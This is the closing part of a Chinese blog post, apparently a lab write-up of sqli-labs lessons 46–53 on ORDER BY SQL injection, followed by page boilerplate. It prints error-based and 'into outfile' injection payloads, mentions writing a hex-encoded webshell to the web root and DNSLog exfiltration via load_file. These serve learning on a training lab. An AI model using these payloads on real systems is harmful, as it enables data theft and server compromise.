+?sort&#x3D;1%20%20procedure%20analyse(updatexml(rand(),concat(0x3a,version()),1),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li>导入导出文件into outfile参数</li>
+</ul>
+<p>将查询结果导入到文件当中</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?sort&#x3D;1%20into%20outfile%20%22c:\\wamp\\www\\sqllib\\test1.txt%22
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>那这个时候我们可以考虑上传网马，利用lines terminated by。</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+Into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16进制转换)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这里需要Web写入权限，之后在研究</p>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;报错</td>
+<td>order by ‘$sort’</td>
+</tr>
+</tbody></table>
+<p>仅仅是闭合方式不同</p>
+<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注</td>
+<td>order by $sort</td>
+</tr>
+</tbody></table>
+<p>没有了报错，但是还可以使用布尔盲注和时间盲注以及intooutfile</p>
+<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注</td>
+<td>order by ’$sort‘</td>
+</tr>
+</tbody></table>
+<p>与上一题的区别闭合不同</p>
+<h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;报错&amp;堆叠注入</td>
+<td>order by $sort</td>
+</tr>
+</tbody></table>
+<p>请求方式从mysqli_qury变为了mysqli_multi_query，所以多了堆叠注入</p>
+<p>详细可看Less-38</p>
+<h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;报错&amp;堆叠注入</td>
+<td>order by ‘$sort’</td>
+</tr>
+</tbody></table>
+<p>闭合方式不同</p>
+<h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>order by $sort</td>
+</tr>
+</tbody></table>
+<p>没有了报错</p>
+<h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>order by ‘$sort’</td>
+</tr>
+</tbody></table>
+<p>与上题区别在于闭合。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>哈哈，又完成了一个专题。主要是，这个专题的完成时间比第二个少多了，知识点少了不少。好，废话不多说，正式回顾。</p>
+<p>首先，我们了解了堆叠注入：结束一个sql语句后继续构造下一条语句，这样就能构造各种各样的注入语句。而且我们的语句数量可以多个。而union只能使用一次。</p>
+<p>但是我们必须知道，在各种网站中一般只会显示一个查询结果，所以查询数据我们还是一般使用union，堆叠注入可以用在对数据库的增删改。</p>
+<p>我们还了解了，loadfile函数，它可以与堆叠注入结合，将查询结果发送到DNSLog中，但是只能在Windows环境下使用。</p>
+<p>之后，我们还遇到了order by的注入，这个注入的不同之处在于无法使用union进行查询，而且根据参数的不同会导致结果的不同，所以我们一般会使用rand进行布尔盲注以及时间盲注。</p>
+<p>此外还有procedure analyse注入，由此使用报错注入，这个报错注入一般使用在order by时，而且卡伊使用在limit之后</p>
+<p>我们还了解了into outfilem，可以写入木马。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Violet</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/09/10/sqllabs/">http://example.com/2021/09/10/sqllabs/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Violet</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/09/11/java-gai-shu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Java概述">
+                        
+                        <span class="card-title">Java概述</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            JAVA概述
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java/" class="post-category">
+                                    Java
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%BC%80%E5%8F%91/">
+                        <span class="chip bg-color">开发</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/09/06/chang-jian-wen-ti-jie-jue/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="常见问题解决">
+                        
+                        <span class="card-title">常见问题解决</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            对于一些遇到的突然问题的解决
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/vmware/" class="post-category">
+                                    vmware
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/vmware/">
+                        <span class="chip bg-color">vmware</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2227373273"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+			<span id="sitetime"></span>
+
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">author Violet</a>
+           
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">52.9k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:88888888" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 888888" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2021, 8, 30, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+
+</body>
+
+</html>
